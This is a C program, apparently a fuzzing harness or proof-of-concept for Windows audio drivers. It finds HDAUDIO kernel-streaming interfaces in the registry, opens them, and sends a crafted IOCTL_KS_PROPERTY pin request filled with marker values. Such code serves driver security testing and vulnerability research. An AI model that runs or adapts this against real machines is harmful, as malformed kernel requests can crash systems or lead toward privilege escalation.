#include<mmdeviceapi.h>
#include<stdio.h>
#include<Functiondiscoverykeys_devpkey.h>
#include <tchar.h>
#include <stdlib.h> 
#include<time.h> 
#include <ctype.h>
const char KSPROPSETID_Topology[] = "\xC0\x4A\x0D\x72\x33\x75\xD0\x11\xA5\xD6\x28\xDB\x04\xC1\x00\x00";
const char KSPIN_Topology[] = "\x60\x49\x13\x8c\xad\x51\xcf\x11\x87\x8a\x94\xf8\x01\xc1\x00\x00";
#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif
void hexdump(void* mem, unsigned int len);
typedef enum {
    KSPROPERTY_PIN_CINSTANCES,
    KSPROPERTY_PIN_CTYPES,
    KSPROPERTY_PIN_DATAFLOW,
    KSPROPERTY_PIN_DATARANGES,
    KSPROPERTY_PIN_DATAINTERSECTION,
    KSPROPERTY_PIN_INTERFACES,
    KSPROPERTY_PIN_MEDIUMS,
    KSPROPERTY_PIN_COMMUNICATION,
    KSPROPERTY_PIN_GLOBALCINSTANCES,
    KSPROPERTY_PIN_NECESSARYINSTANCES,
    KSPROPERTY_PIN_PHYSICALCONNECTION,
    KSPROPERTY_PIN_CATEGORY,
    KSPROPERTY_PIN_NAME,
    KSPROPERTY_PIN_CONSTRAINEDDATARANGES,
    KSPROPERTY_PIN_PROPOSEDATAFORMAT,
    KSPROPERTY_PIN_PROPOSEDATAFORMAT2,
    KSPROPERTY_PIN_MODEDATAFORMATS,
} KSPROPERTY_PIN;


#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383
#define EXIT_ON_ERROR(hres) if (FAILED(hres)) { goto Exit; }
#define SAFE_RELEASE(punk) if ((punk) != NULL) { (punk)->Release(); (punk) = NULL; }
#define MAX_INTERFACE_NUM 4096
#define IOCTL_HDAUDIO_PRIVATE          CTL_CODE(FILE_DEVICE_KS, 0x000, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KS_PROPERTY              CTL_CODE(FILE_DEVICE_KS, 0x000, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_KS_ENABLE_EVENT          CTL_CODE(FILE_DEVICE_KS, 0x001, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_KS_DISABLE_EVENT         CTL_CODE(FILE_DEVICE_KS, 0x002, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_KS_METHOD                CTL_CODE(FILE_DEVICE_KS, 0x003, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_KS_WRITE_STREAM          CTL_CODE(FILE_DEVICE_KS, 0x004, METHOD_NEITHER, FILE_WRITE_ACCESS)
#define IOCTL_KS_READ_STREAM           CTL_CODE(FILE_DEVICE_KS, 0x005, METHOD_NEITHER, FILE_READ_ACCESS)
#define IOCTL_KS_RESET_STATE           CTL_CODE(FILE_DEVICE_KS, 0x006, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_KS_HANDSHAKE             CTL_CODE(FILE_DEVICE_KS, 0x0007, METHOD_NEITHER, FILE_ANY_ACCESS)
#define KSPROPERTY_TYPE_GET                 0x00000001//0
#define KSPROPERTY_TYPE_SET                 0x00000002//1
#define KSPROPERTY_TYPE_GETPAYLOADSIZE      0x00000004//2
#define KSPROPERTY_TYPE_UNUSED             0x00000008//3
#define KSPROPERTY_TYPE_UNUSED             0x00000010//4
#define KSPROPERTY_TYPE_UNUSED             0x00000020//5
#define KSPROPERTY_TYPE_UNUSED             0x00000040//6
#define KSPROPERTY_TYPE_UNUSED             0x00000080//7
#define KSPROPERTY_TYPE_SETSUPPORT          0x00000100//8
#define KSPROPERTY_TYPE_BASICSUPPORT        0x00000200//9
#define KSPROPERTY_TYPE_RELATIONS           0x00000400//0xa
#define KSPROPERTY_TYPE_SERIALIZESET        0x00000800//0xb
#define KSPROPERTY_TYPE_UNSERIALIZESET      0x00001000//0xc
#define KSPROPERTY_TYPE_SERIALIZERAW        0x00002000//0xd
#define KSPROPERTY_TYPE_UNSERIALIZERAW      0x00004000//0xe
#define KSPROPERTY_TYPE_SERIALIZESIZE       0x00008000//0xF
#define KSPROPERTY_TYPE_DEFAULTVALUES       0x00010000//0x10
#define KSPROPERTY_TYPE_UNUSED             0x00020000//0x11
#define KSPROPERTY_TYPE_UNUSED             0x00040000//0x12
#define KSPROPERTY_TYPE_UNUSED             0x00080000//0x13
#define KSPROPERTY_TYPE_UNUSED             0x00100000//0x14
#define KSPROPERTY_TYPE_UNUSED             0x00200000//0x15
#define KSPROPERTY_TYPE_UNUSED             0x00400000//0x16
#define KSPROPERTY_TYPE_UNUSED             0x00800000//0x17
#define KSPROPERTY_TYPE_UNUSED             0x01000000//0x18
#define KSPROPERTY_TYPE_UNUSED             0x02000000//0x19
#define KSPROPERTY_TYPE_UNUSED             0x04000000//0x1a
#define KSPROPERTY_TYPE_HIGHPRIORITY        0x08000000//0x1b
#define KSPROPERTY_TYPE_TOPOLOGY            0x10000000//0x1c
#define KSPROPERTY_TYPE_UNUSED       0x20000000//0x1d
#define KSPROPERTY_TYPE_FSFILTERSCOPE       0x40000000//0x1e
#define KSPROPERTY_TYPE_COPYPAYLOAD         0x80000000//0x1f
void PrintEndpointNames();
void PrintEndpoint(IMMDevice* pEndpoint);
TCHAR    listInterface[MAX_INTERFACE_NUM][MAX_KEY_LENGTH];
DWORD currentInterface = 0;
DWORD cbInterface = 0;
wchar_t* parrent;
const CLSID CLSID_MMDeviceEnumerator = __uuidof(MMDeviceEnumerator);
int t = 0;
struct KSPROPERTY {
    GUID  Set;
    ULONG Id;
    ULONG Flags;
};
typedef struct {
    KSPROPERTY Property;
    ULONG      PinId;
    union {
        ULONG Reserved;
        ULONG Flags;
    };
    DWORD arg[0x10];

} KSP_PIN, * PKSP_PIN;
void printntab(int n)
{
    for (int i = 0; i < n; ++i)
    {
        printf("\t");
    }
}
void initRandom(char* buffer, int size)
{
    int i;
    for (i = 0; i < size; i++)
    {
        buffer[i] = rand() ;
    }
}
void ProcessKEY(TCHAR* name, HKEY hKey)
{
    TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
    DWORD    cbName;                   // size of name string 
    TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name 
    DWORD    cchClassName = MAX_PATH;  // size of class string 
    DWORD    cSubKeys = 0;               // number of subkeys 
    DWORD    cbMaxSubKey;              // longest subkey size 
    DWORD    cchMaxClass;              // longest class string 
    DWORD    cValues;              // number of values for key 
    DWORD    cchMaxValue;          // longest value name 
    DWORD    cbMaxValueData;       // longest value data 
    DWORD    cbSecurityDescriptor; // size of security descriptor 
    FILETIME ftLastWriteTime;      // last write time 

    DWORD i, retCode;

    TCHAR  achValue[MAX_VALUE_NAME];
    DWORD cchValue = MAX_VALUE_NAME;

    // Get the class name and the value count. 
    retCode = RegQueryInfoKey(
        hKey,                    // key handle 
        achClass,                // buffer for class name 
        &cchClassName,           // size of class string 
        NULL,                    // reserved 
        &cSubKeys,               // number of subkeys 
        &cbMaxSubKey,            // longest subkey size 
        &cchMaxClass,            // longest class string 
        &cValues,                // number of values for this key 
        &cchMaxValue,            // longest value name 
        &cbMaxValueData,         // longest value data 
        &cbSecurityDescriptor,   // security descriptor 
        &ftLastWriteTime);       // last write time

    for (int i = 0; i < cSubKeys; ++i)
    {
        cbName = MAX_KEY_LENGTH;
        retCode = RegEnumKeyEx(hKey, i,
            achKey,
            &cbName,
            NULL,
            NULL,
            NULL,
            &ftLastWriteTime);
        if (retCode == ERROR_SUCCESS)
        {
            achKey[0] = L'\\';
            wprintf_s(TEXT("%s%s\n"), name, achKey);
            swprintf_s(listInterface[currentInterface], TEXT("%s%s"), name, achKey);
            ++currentInterface;
        }
        cbInterface = currentInterface;
    }
}
int main()
{
    srand(time(0));
    HKEY deviceKey;
    LSTATUS hr;
    hr = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Control\\DeviceClasses", 0, KEY_READ, &deviceKey);
    printf("Status %d hKey %d\n", hr, deviceKey);
    //QueryKey(deviceKey);
    TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
    DWORD    cbName;                   // size of name string 
    TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name 
    DWORD    cchClassName = MAX_PATH;  // size of class string 
    DWORD    cSubKeys = 0;               // number of subkeys 
    DWORD    cbMaxSubKey;              // longest subkey size 
    DWORD    cchMaxClass;              // longest class string 
    DWORD    cValues;              // number of values for key 
    DWORD    cchMaxValue;          // longest value name 
    DWORD    cbMaxValueData;       // longest value data 
    DWORD    cbSecurityDescriptor; // size of security descriptor 
    FILETIME ftLastWriteTime;      // last write time 

    DWORD i, retCode;

    TCHAR  achValue[MAX_VALUE_NAME];
    DWORD cchValue = MAX_VALUE_NAME;

    // Get the class name and the value count. 
    retCode = RegQueryInfoKey(
        deviceKey,                    // key handle 
        achClass,                // buffer for class name 
        &cchClassName,           // size of class string 
        NULL,                    // reserved 
        &cSubKeys,               // number of subkeys 
        &cbMaxSubKey,            // longest subkey size 
        &cchMaxClass,            // longest class string 
        &cValues,                // number of values for this key 
        &cchMaxValue,            // longest value name 
        &cbMaxValueData,         // longest value data 
        &cbSecurityDescriptor,   // security descriptor 
        &ftLastWriteTime);       // last write time 

    // Enumerate the subkeys, until RegEnumKeyEx fails.

    if (cSubKeys)
    {

        for (i = 0; i < cSubKeys; i++)
        {
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(deviceKey, i,
                achKey,
                &cbName,
                NULL,
                NULL,
                NULL,
                &ftLastWriteTime);
            if (retCode == ERROR_SUCCESS)
            {
                HKEY sub;

                //wprintf_s(TEXT("%s\n"), achKey);
                DWORD cSubKeys1 = 0;
                retCode = RegOpenKeyEx(deviceKey, achKey, 0, KEY_READ, &sub);
                if (retCode == 0)
                {
                    retCode = RegQueryInfoKey(
                        sub,                    // key handle 
                        achClass,                // buffer for class name 
                        &cchClassName,           // size of class string 
                        NULL,                    // reserved 
                        &cSubKeys1,               // number of subkeys 
                        &cbMaxSubKey,            // longest subkey size 
                        &cchMaxClass,            // longest class string 
                        &cValues,                // number of values for this key 
                        &cchMaxValue,            // longest value name 
                        &cbMaxValueData,         // longest value data 
                        &cbSecurityDescriptor,   // security descriptor 
                        &ftLastWriteTime);       // last write time 
                    for (int j = 0; j < cSubKeys1; ++j)
                    {


                        cbName = MAX_KEY_LENGTH;
                        retCode = RegEnumKeyEx(sub, j,
                            achKey,
                            &cbName,
                            NULL,
                            NULL,
                            NULL,
                            &ftLastWriteTime);
                        if (wcsstr(achKey, L"HDAUDIO"))
                        {
                            HKEY hdaudioKey;
                            retCode = RegOpenKeyEx(sub, achKey, 0, KEY_READ, &hdaudioKey);
                            if (retCode == ERROR_SUCCESS)
                            {
                                achKey[0] = L'\\';
                                achKey[1] = L'\\';
                                achKey[3] = L'\\';
                                ProcessKEY(achKey, hdaudioKey);
                            }
                        }
                        //wprintf_s(TEXT("\t%s\n"), achKey);

                    }

                }


            }
        }
    }
    RegCloseKey(deviceKey);
    
        
    for (int i = 0; i < cbInterface; ++i)
        {
            HANDLE h = CreateFileW(listInterface[i],
                FILE_READ_ACCESS | FILE_WRITE_ACCESS,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                0,
                NULL);
            if (h != INVALID_HANDLE_VALUE)
            {

                /**************** FUZZ PARAM ******************/
                char* instrument;
                SIZE_T inputLength = 0x68;
                SIZE_T outputLength = 0x10e;
                char* inputBuffer = (char*)VirtualAlloc(NULL, inputLength, MEM_COMMIT, PAGE_READWRITE);
                printf("Address of input buffer :  0x%p GLE : 0x%x", inputBuffer, GetLastError());
                char* outputBuffer = (char*)VirtualAlloc(NULL, outputLength, MEM_COMMIT, PAGE_READWRITE);
                printf("Address of output buffer :  0x%p GLE : 0x%x", outputBuffer, GetLastError());
                
                KSP_PIN pin = { 0 };
                
                pin.Property.Flags = 0;
                
                pin.Property.Flags = KSPROPERTY_TYPE_GET ;
                pin.Property.Id = 4;

                pin.PinId = 1;
                int index;
                for (index = 0; index < 0x10; ++index)
                {
                    pin.arg[index] = index;
                }
                pin.arg[1] = 0xDEADDEAD;
                pin.arg[2] = 0x11111111;
                pin.arg[3] = 6;
                memcpy(&pin.Property.Set, &KSPIN_Topology, 16);
                wprintf_s(TEXT("CreateFile %s . Result : %x\n"), listInterface[i], h);

                memcpy(inputBuffer, &pin, sizeof(KSP_PIN));
                DWORD retByte;
                OVERLAPPED overlap = { 0 };
                NTSTATUS status;

                status = DeviceIoControl(h, IOCTL_KS_PROPERTY, inputBuffer, inputLength, outputBuffer, outputLength, &retByte, &overlap);
                VirtualFree(outputBuffer, 0, MEM_RELEASE);
                CloseHandle(h);    
                break;
                
            }
    }
    
}